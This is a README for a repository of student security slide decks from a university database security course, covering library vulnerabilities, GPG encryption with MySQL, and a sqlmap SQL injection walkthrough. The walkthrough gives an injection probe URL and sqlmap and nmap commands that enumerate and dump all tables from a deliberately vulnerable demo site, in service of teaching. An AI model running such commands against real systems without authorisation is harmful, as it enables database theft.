# Presentation Repository

## Overview
This repository contains three PowerPoint presentations covering different aspects of application and data security, including static analysis, encryption, and SQL injection testing. Each slide deck is intended for developers, security professionals, and IT students to gain practical knowledge on identifying and mitigating common vulnerabilities.

---

## Contents
- **Presentation Files**
  1. `Software Code & Threat Analysis.pptx`  
     Explores tools, vulnerable libraries, CVEs, and mitigation strategies.
  2. `Secure Data Storage and Encryption using GnuPG.pptx`  
     Demonstrates how to set up MySQL securely and implement GPG encryption for data protection.
  3. `SQL Injection Testing using SQLmap.pptx`  
     Provides a walkthrough of using sqlmap to discover and exploit SQL injection flaws in a target web application.

- **README.md**  
  This file, which explains the purpose, structure, and usage instructions for the repository.

---

## Slide Deck Breakdowns

### 1. Software Code & Threat Analysis
1. **Title Slide**  
   - “Software Code & Threat Analysis Presentation” – Objectives and scope.
2. **Flawfinder**  
   - Overview of Flawfinder for scanning C/C++ source code against CWE listings.
3. **ImageMagick v7.1.0-27**  
   - History (October 2021 release) and associated security risks when processing untrusted images.
4. **Detail/Discover Software Threats**  
   - Guidance on identifying weaknesses in software dependencies and image-processing libraries.
5. **CVE-2022-28463 Mitigation**  
   - Explanation of the ImageMagick-related vulnerability and recommended patch/workaround steps.
6. **FFmpeg v4.4.3**  
   - Overview (released August 26 2021), typical use cases, and multimedia processing vulnerabilities.
7. **Threat Discovery for FFmpeg**  
   - Spotting unsafe library usage, untrusted codecs, and malicious media streams.
8. **FFmpeg Mitigations**  
   - Best practices: updating to a secure FFmpeg version, sandboxing, and safe configuration.
9. **OWASP Dependency-Check**  
   - Introduction to OWASP Dependency-Check as a software composition analysis (SCA) tool for various runtimes (Java, .NET, Ruby, Python, Node.js).
10. **Apache Struts v2.2.3.1**  
    - Historical context (released 2011), common exploit vectors, and notable security incidents.
11. **Threat Discovery in Struts**  
    - Auditing Struts-based applications, identifying outdated components, and risk assessment.
12. **Struts Mitigations**  
    - Upgrading to a secure Struts version, applying vendor patches, and using runtime protections (e.g., WAF rules).
13. **OpenSSL v1.0.1**  
    - Overview (released 2012), significant vulnerabilities (e.g., Heartbleed), and cryptography-related risks.
14. **Threat Discovery in OpenSSL**  
    - Identifying insecure API usage, weak cipher configurations, and out-of-date libraries.
15. **OpenSSL Mitigations**  
    - Best practices: updating OpenSSL, enforcing strong cipher suites, and performing regular cryptographic audits.

---

### 2. Secure Data Storage and Encryption using GnuPG
1. **Title Slide & Group Credits**  
   - “Secure Data Storage and Encryption using GnuPG”  
   - Contributors: Bhargava Reddy Kikkura, Bharath Kumar Uppala, Hari Kiran Gaddam, Bharath Viswa Teja, Vidya Charan Maddala, Rajabinandhan Periyagoundanoor Gopal.
2. **Introduction to Database & MySQL**  
   - Definition of a database.  
   - Overview of MySQL as an open-source RDBMS (speed, reliability, ease of use).
3. **Logging into MySQL & Creating a Database**  
   - Steps to log in as `root`.  
   - SQL commands to create a new database.
4. **Creating Tables in the Database**  
   - SQL statements for defining tables (columns, data types, primary keys).
5. **Inserting Data**  
   - `INSERT` commands demonstrating how to populate tables with sample records.
6. **Creating a User for the Database**  
   - SQL commands to create a dedicated MySQL user and grant appropriate privileges.
7. **GPG Encryption Keys Overview**  
   - Importance of GPG for private digital communication: public/private key pairs, digital signatures, encrypted email, and secure file sharing.
8. **Setting up GPG**  
   - Installation and configuration steps.  
   - Choosing key type and key size, entering user metadata, and creating a strong passphrase.
9. **Exporting Keys to ASCII Files**  
   - Command to export the public key in ASCII-armored format:  
     ```bash
     gpg --export --armor > public_key.asc
     ```  
   - Command to list and export the secret (private) key securely.
10. **Encryption & Decryption Implementation**  
    - Role of encryption: protecting database backups, files, and preventing unauthorized access.  
    - Role of decryption: allowing only authorized users (with correct private key/passphrase) to read protected data.  
    - Example commands:  
      ```bash
      # Encrypt a file for a recipient
      gpg --encrypt --recipient <recipient-email> <file-to-encrypt>

      # Decrypt an encrypted file
      gpg --decrypt <encrypted-file>
      ```
11. **Use Cases & Best Practices**  
    - Encrypting MySQL backups before archiving or transferring off-site.  
    - Secure file-sharing workflows:  
      - Generating a new keypair per user.  
      - Keeping private keys offline.  
      - Rotating keys periodically.

---

### 3. SQL Injection Testing using SQLmap
1. **Title Slide & Course Context**  
   - “SQL Injection Testing using SQLmap”  
   - Database Security (ITMS-528-01), Illinois Institute of Technology, Department of Information Technology and Management.  
   - Contributors: Bhargava Reddy Kikkura, Bharath Kumar Uppala, Hari Kiran Gaddam, Bharath Viswa Teja, Vidya Charan Maddala, Rajabinandhan Periyagoundanoor Gopal. :contentReference[oaicite:0]{index=0}
2. **Scouting the Target Website**  
   - Identifying a live, vulnerable endpoint:  
     ```
     http://testphp.vulnweb.com/listproducts.php?cat=1
     ```  
   - Testing URL parameter injection:  
     ```
     http://testphp.vulnweb.com/listproducts.php?cat='
     ```
3. **Using Nmap on the Target**  
   - Running Nmap to enumerate open ports or services (e.g., HTTP, database ports) before running sqlmap.  
   - Command example (scan flags may vary):  
     ```bash
     nmap -sV testphp.vulnweb.com
     ```
4. **Enumerating Databases with sqlmap**  
   - Basic command to fetch database names:  
     ```bash
     sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --dbs
     ```  
   - Example result:  
     ```
     acuart  
     information_schema
     ```
5. **Extracting Table Names**  
   - Using `-D` to specify the database and `--tables` to list all tables:  
     ```bash
     sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart --tables
     ```  
   - Example tables in `acuart`:  
     ```
     Artists  
     Carts  
     Categ  
     Featured  
     Guestbook  
     Pictures  
     products  
     users
     ```
6. **Dumping All Table Data**  
   - Using `-a` (all) to fetch all data from every table automatically:  
     ```bash
     sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart --tables -a
     ```
7. **Filtering Specific Information**  
   - Targeting `information_schema` tables to list system metadata:  
     ```bash
     sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D information_schema --tables
     ```
   - Finding specific columns in a system table, e.g.,  
     `ADMINISTRABLE_ROLE_AUTHORIZATIONS`:  
     ```bash
     sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" \
       -D information_schema -T ADMINISTRABLE_ROLE_AUTHORIZATIONS -columns
     ```
8. **Best Practices & Mitigations**  
   - Demonstrates how to identify injection points, enumerate databases, tables, and columns, and extract sensitive data.  
   - Emphasizes the importance of parameterized queries, ORM protections, input validation, and proper error handling to prevent SQL injection.

---

## How to View the Slide Decks
1. **Clone or Download**  
   ```bash
   git clone https://github.com/<your-username>/<repository-name>.git
   cd <repository-name>
